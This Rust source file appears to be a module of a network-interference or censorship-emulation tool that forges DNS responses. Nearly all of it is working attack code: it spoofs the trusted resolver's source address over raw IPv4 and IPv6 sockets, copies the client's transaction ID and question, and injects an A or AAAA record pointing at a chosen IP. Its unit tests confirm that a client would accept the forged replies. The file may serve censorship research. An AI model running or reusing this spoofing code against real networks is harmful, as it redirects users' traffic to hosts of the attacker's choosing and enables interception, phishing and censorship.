// DNS redirect injection - the other classic censorship technique alongside RST
// injection: instead of killing the connection, forge a DNS response pointing the
// query at a different IP before the real resolver's answer arrives. Same race
// dynamic as RST injection, same off-path spoofing, just a different forged payload.
use crate::classify::DnsQuery;
use pnet::packet::ipv4::{checksum as ipv4_checksum, Ipv4Flags, MutableIpv4Packet};
use pnet::packet::udp::{ipv4_checksum as udp_checksum, ipv6_checksum as udp_checksum_v6, MutableUdpPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::transport::{transport_channel, TransportChannelType, TransportSender};
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

const IP_HDR_LEN: usize = 20;
const IPV6_HDR_LEN: usize = 40;
const UDP_HDR_LEN: usize = 8;

pub fn open_raw_udp_sender() -> std::io::Result<TransportSender> {
    let (tx, _rx) = transport_channel(4096, TransportChannelType::Layer3(IpNextHeaderProtocols::Udp))?;
    Ok(tx)
}

/// Build a spoofed DNS response: appears to come from `dns_server` (the real
/// resolver's address the client already trusts), answers `query` (echoing its
/// transaction ID and question section verbatim) with a single A record pointing
/// at `answer_ip`.
fn build_dns_response(
    dns_server: Ipv4Addr,
    client: Ipv4Addr,
    client_port: u16,
    query: &DnsQuery,
    answer_ip: Ipv4Addr,
) -> Vec<u8> {
    let mut dns = Vec::new();
    dns.extend_from_slice(&query.id.to_be_bytes());
    dns.extend_from_slice(&[0x81, 0x80]); // QR=1 response, RD=1, RA=1, no error
    dns.extend_from_slice(&1u16.to_be_bytes()); // qdcount
    dns.extend_from_slice(&1u16.to_be_bytes()); // ancount
    dns.extend_from_slice(&0u16.to_be_bytes()); // nscount
    dns.extend_from_slice(&0u16.to_be_bytes()); // arcount
    dns.extend_from_slice(&query.question_raw); // echo the question verbatim

    // Answer record: name = compression pointer back to the question's name (offset
    // 12, right after the header) rather than re-encoding it.
    dns.extend_from_slice(&[0xC0, 0x0C]);
    dns.extend_from_slice(&1u16.to_be_bytes()); // TYPE A
    dns.extend_from_slice(&1u16.to_be_bytes()); // CLASS IN
    dns.extend_from_slice(&300u32.to_be_bytes()); // TTL
    dns.extend_from_slice(&4u16.to_be_bytes()); // RDLENGTH
    dns.extend_from_slice(&answer_ip.octets());

    let mut buf = vec![0u8; IP_HDR_LEN + UDP_HDR_LEN + dns.len()];
    buf[IP_HDR_LEN + UDP_HDR_LEN..].copy_from_slice(&dns);

    {
        let mut udp = MutableUdpPacket::new(&mut buf[IP_HDR_LEN..]).unwrap();
        udp.set_source(53);
        udp.set_destination(client_port);
        udp.set_length((UDP_HDR_LEN + dns.len()) as u16);
        let cksum = udp_checksum(&udp.to_immutable(), &dns_server, &client);
        udp.set_checksum(cksum);
    }
    {
        let mut ip = MutableIpv4Packet::new(&mut buf).unwrap();
        ip.set_version(4);
        ip.set_header_length(5);
        ip.set_total_length(buf_len(IP_HDR_LEN, UDP_HDR_LEN, dns.len()));
        ip.set_ttl(64);
        ip.set_flags(Ipv4Flags::DontFragment);
        ip.set_next_level_protocol(IpNextHeaderProtocols::Udp);
        ip.set_source(dns_server);
        ip.set_destination(client);
        let cksum = ipv4_checksum(&ip.to_immutable());
        ip.set_checksum(cksum);
    }
    buf
}

fn buf_len(ip: usize, udp: usize, dns: usize) -> u16 {
    (ip + udp + dns) as u16
}

/// Send the spoofed response. `dns_server` should be the resolver IP the client's
/// query was actually sent to, so the spoofed reply comes from an address it trusts.
pub fn send_dns_redirect(
    tx: &mut TransportSender,
    dns_server: Ipv4Addr,
    client: Ipv4Addr,
    client_port: u16,
    query: &DnsQuery,
    answer_ip: Ipv4Addr,
) -> std::io::Result<()> {
    let raw = build_dns_response(dns_server, client, client_port, query, answer_ip);
    let packet = pnet::packet::ipv4::Ipv4Packet::new(&raw).unwrap();
    tx.send_to(packet, IpAddr::V4(client))?;
    Ok(())
}

/// Build a spoofed DNS response over IPv6+UDP with an AAAA record (type 28,
/// 16-byte address) instead of A. Pure/testable everywhere - the platform
/// restriction is entirely in *sending* it (see `Ipv6DnsSender` below), not
/// in constructing the bytes.
fn build_dns_response_v6(
    dns_server: Ipv6Addr,
    client: Ipv6Addr,
    client_port: u16,
    query: &DnsQuery,
    answer_ip: Ipv6Addr,
) -> Vec<u8> {
    let mut dns = Vec::new();
    dns.extend_from_slice(&query.id.to_be_bytes());
    dns.extend_from_slice(&[0x81, 0x80]);
    dns.extend_from_slice(&1u16.to_be_bytes());
    dns.extend_from_slice(&1u16.to_be_bytes());
    dns.extend_from_slice(&0u16.to_be_bytes());
    dns.extend_from_slice(&0u16.to_be_bytes());
    dns.extend_from_slice(&query.question_raw);

    dns.extend_from_slice(&[0xC0, 0x0C]);
    dns.extend_from_slice(&28u16.to_be_bytes()); // TYPE AAAA
    dns.extend_from_slice(&1u16.to_be_bytes()); // CLASS IN
    dns.extend_from_slice(&300u32.to_be_bytes()); // TTL
    dns.extend_from_slice(&16u16.to_be_bytes()); // RDLENGTH
    dns.extend_from_slice(&answer_ip.octets());

    let mut buf = vec![0u8; IPV6_HDR_LEN + UDP_HDR_LEN + dns.len()];
    buf[IPV6_HDR_LEN + UDP_HDR_LEN..].copy_from_slice(&dns);

    {
        let mut udp = MutableUdpPacket::new(&mut buf[IPV6_HDR_LEN..]).unwrap();
        udp.set_source(53);
        udp.set_destination(client_port);
        udp.set_length((UDP_HDR_LEN + dns.len()) as u16);
        let cksum = udp_checksum_v6(&udp.to_immutable(), &dns_server, &client);
        udp.set_checksum(cksum);
    }
    {
        let mut ip = pnet::packet::ipv6::MutableIpv6Packet::new(&mut buf).unwrap();
        ip.set_version(6);
        ip.set_payload_length((UDP_HDR_LEN + dns.len()) as u16);
        ip.set_next_header(IpNextHeaderProtocols::Udp);
        ip.set_hop_limit(64);
        ip.set_source(dns_server);
        ip.set_destination(client);
    }
    buf
}

/// Raw IPv6 sender with a custom (spoofed-source) header, via IPV6_HDRINCL.
/// Linux-only: confirmed absent from macOS's libc bindings (grepped the actual
/// Darwin source, not assumed) - macOS's raw IPv6 socket API doesn't support
/// supplying a full custom header the way IPv4's IP_HDRINCL does. This matters
/// beyond "one less feature": DNS resolvers use *connected* UDP sockets, so a
/// reply carrying the real (non-spoofed) source address is silently dropped by
/// the kernel before the resolver ever sees it - there's no degraded-but-working
/// fallback here, spoofing is load-bearing for this technique to function at all.
pub struct Ipv6DnsSender {
    #[cfg(target_os = "linux")]
    fd: std::os::fd::RawFd,
}

#[cfg(target_os = "linux")]
impl Ipv6DnsSender {
    pub fn open() -> std::io::Result<Self> {
        unsafe {
            let fd = libc::socket(libc::AF_INET6, libc::SOCK_RAW, libc::IPPROTO_UDP);
            if fd < 0 {
                return Err(std::io::Error::last_os_error());
            }
            let on: libc::c_int = 1;
            let res = libc::setsockopt(
                fd,
                libc::IPPROTO_IPV6,
                libc::IPV6_HDRINCL,
                &on as *const _ as *const libc::c_void,
                std::mem::size_of::<libc::c_int>() as libc::socklen_t,
            );
            if res < 0 {
                let e = std::io::Error::last_os_error();
                libc::close(fd);
                return Err(e);
            }
            Ok(Self { fd })
        }
    }

    fn send_raw(&self, packet: &[u8], dst: Ipv6Addr) -> std::io::Result<()> {
        unsafe {
            let mut addr: libc::sockaddr_in6 = std::mem::zeroed();
            addr.sin6_family = libc::AF_INET6 as libc::sa_family_t;
            addr.sin6_addr = libc::in6_addr { s6_addr: dst.octets() };
            let ret = libc::sendto(
                self.fd,
                packet.as_ptr() as *const libc::c_void,
                packet.len(),
                0,
                &addr as *const _ as *const libc::sockaddr,
                std::mem::size_of::<libc::sockaddr_in6>() as libc::socklen_t,
            );
            if ret < 0 {
                return Err(std::io::Error::last_os_error());
            }
            Ok(())
        }
    }
}

#[cfg(target_os = "linux")]
impl Drop for Ipv6DnsSender {
    fn drop(&mut self) {
        unsafe {
            libc::close(self.fd);
        }
    }
}

#[cfg(not(target_os = "linux"))]
impl Ipv6DnsSender {
    pub fn open() -> std::io::Result<Self> {
        Err(std::io::Error::other(
            "IPv6 DNS redirect needs IPV6_HDRINCL, which this platform's raw IPv6 socket \
             API doesn't support (confirmed absent from macOS's libc bindings) - run on \
             Linux for this feature, or use --redirect-dns for IPv4 only.",
        ))
    }

    fn send_raw(&self, _packet: &[u8], _dst: Ipv6Addr) -> std::io::Result<()> {
        unreachable!("Ipv6DnsSender::open() always errors on this platform, so this is never called")
    }
}

pub fn send_dns_redirect_v6(
    tx: &Ipv6DnsSender,
    dns_server: Ipv6Addr,
    client: Ipv6Addr,
    client_port: u16,
    query: &DnsQuery,
    answer_ip: Ipv6Addr,
) -> std::io::Result<()> {
    let raw = build_dns_response_v6(dns_server, client, client_port, query, answer_ip);
    tx.send_raw(&raw, client)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::classify::parse_dns_query_full;
    use pnet::packet::ipv4::Ipv4Packet;
    use pnet::packet::udp::UdpPacket;
    use pnet::packet::Packet;

    #[test]
    fn redirect_response_is_well_formed_and_client_would_accept_it() {
        let query = DnsQuery { id: 0x1234, name: "florianscholz.dev".into(), question_raw: {
            let mut q = vec![];
            for label in ["florianscholz", "dev"] {
                q.push(label.len() as u8);
                q.extend_from_slice(label.as_bytes());
            }
            q.push(0);
            q.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]); // QTYPE A, QCLASS IN
            q
        }};
        let dns_server = Ipv4Addr::new(10, 27, 0, 10);
        let client = Ipv4Addr::new(10, 27, 0, 39);
        let answer_ip = Ipv4Addr::new(93, 184, 215, 14);

        let raw = build_dns_response(dns_server, client, 55555, &query, answer_ip);
        let ip = Ipv4Packet::new(&raw).unwrap();
        assert_eq!(ip.get_source(), dns_server);
        assert_eq!(ip.get_destination(), client);

        let udp = UdpPacket::new(ip.payload()).unwrap();
        assert_eq!(udp.get_source(), 53);
        assert_eq!(udp.get_destination(), 55555);

        // Client-side sanity: the response's own question section, if re-parsed,
        // must reproduce the exact name the client asked about (transaction
        // matching, the thing a real resolver checks before accepting an answer).
        let reparsed = parse_dns_query_full(udp.payload()).unwrap();
        assert_eq!(reparsed.id, 0x1234);
        assert_eq!(reparsed.name, "florianscholz.dev");

        // Answer section: compression pointer + A record with our spoofed IP.
        let dns = udp.payload();
        let ancount = u16::from_be_bytes([dns[6], dns[7]]);
        assert_eq!(ancount, 1);
        let rdata = &dns[dns.len() - 4..];
        assert_eq!(rdata, &answer_ip.octets());
    }

    #[test]
    fn v6_redirect_response_is_well_formed() {
        // Pure packet-building is testable on every platform even though actually
        // *sending* it only works on Linux (see Ipv6DnsSender's platform note).
        let query = DnsQuery {
            id: 0xabcd,
            name: "florianscholz.dev".into(),
            question_raw: {
                let mut q = vec![];
                for label in ["florianscholz", "dev"] {
                    q.push(label.len() as u8);
                    q.extend_from_slice(label.as_bytes());
                }
                q.push(0);
                q.extend_from_slice(&[0x00, 0x1c, 0x00, 0x01]); // QTYPE AAAA, QCLASS IN
                q
            },
        };
        let dns_server: Ipv6Addr = "fe80::1".parse().unwrap();
        let client: Ipv6Addr = "fe80::39".parse().unwrap();
        let answer_ip: Ipv6Addr = "2606:2800:220:1:248:1893:25c8:1946".parse().unwrap();

        let raw = build_dns_response_v6(dns_server, client, 55555, &query, answer_ip);
        let ip = pnet::packet::ipv6::Ipv6Packet::new(&raw).unwrap();
        assert_eq!(ip.get_version(), 6);
        assert_eq!(ip.get_source(), dns_server);
        assert_eq!(ip.get_destination(), client);
        assert_eq!(ip.get_next_header(), IpNextHeaderProtocols::Udp);

        let udp = UdpPacket::new(ip.payload()).unwrap();
        assert_eq!(udp.get_source(), 53);
        assert_eq!(udp.get_destination(), 55555);

        let reparsed = parse_dns_query_full(udp.payload()).unwrap();
        assert_eq!(reparsed.id, 0xabcd);
        assert_eq!(reparsed.name, "florianscholz.dev");

        let dns = udp.payload();
        let ancount = u16::from_be_bytes([dns[6], dns[7]]);
        assert_eq!(ancount, 1);
        let rdata = &dns[dns.len() - 16..]; // AAAA = 16-byte address
        assert_eq!(rdata, &answer_ip.octets());
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn v6_sender_reports_platform_limitation_not_silent_failure() {
        match Ipv6DnsSender::open() {
            Err(e) => assert!(e.to_string().contains("IPV6_HDRINCL")),
            Ok(_) => panic!("expected an error on this platform"),
        }
    }
}
